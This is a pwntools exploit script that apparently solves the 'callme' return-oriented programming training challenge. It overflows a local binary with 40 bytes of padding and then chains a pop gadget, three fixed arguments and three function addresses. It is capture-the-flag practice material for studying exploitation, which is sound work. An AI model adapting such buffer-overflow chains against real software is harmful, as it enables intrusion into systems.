#!/usr/bin/python
from pwn import *

p = process('./callme')

#arguments
arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

all_args = arg1 + arg2 + arg3

#pop registers
pop_args = p64(0x0040093c)
pop_reg = pop_args

#function calls
callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)

#chain creation
payload = b"A"*40 #Create padding

payload += pop_args # Callme_one
payload += all_args
payload += callme_one

payload += pop_args # Callme_two
payload += all_args
payload += callme_two

payload += pop_args # Callme_three
payload += all_args
payload += callme_three

#pass chain to program
#print(payload)
p.sendline(payload)

response = p.recvall()
print(response)
